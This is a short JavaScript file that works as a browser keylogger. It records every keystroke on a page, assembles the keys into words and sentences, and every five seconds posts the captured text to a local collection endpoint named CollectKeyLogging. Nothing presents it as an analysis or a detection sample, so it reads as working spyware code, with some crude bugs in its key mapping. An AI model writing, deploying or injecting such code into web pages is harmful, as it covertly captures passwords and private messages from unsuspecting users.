var word = "";
var sentence = "";
var text = "";

document.addEventListener("keydown", function (event) {
    var character_code = event.which || event.keyCode;
    var character_value = String.fromCharCode(character_code);
    console.log("Current character: " + character_code + " " + character_value);
    word = word + character_value;
    if (character_code == 32) {
        console.log("Word: " + word);
        sentence += word;
        word = "";
    }
    if (character_code == 13 || character_code == 190) {
        console.log("Sentence: " + sentence);
        text += sentence + word;
        word = "";
    }
});

setInterval(function () {
    if (text.length > 0) {
        console.log("Text for submission: " + text);
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://localhost:1615/API/CollectKeyLogging');
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send('sentence=' + sentence);
        text = "";
        sentence = "";
        word = "";
    }
}, 5000);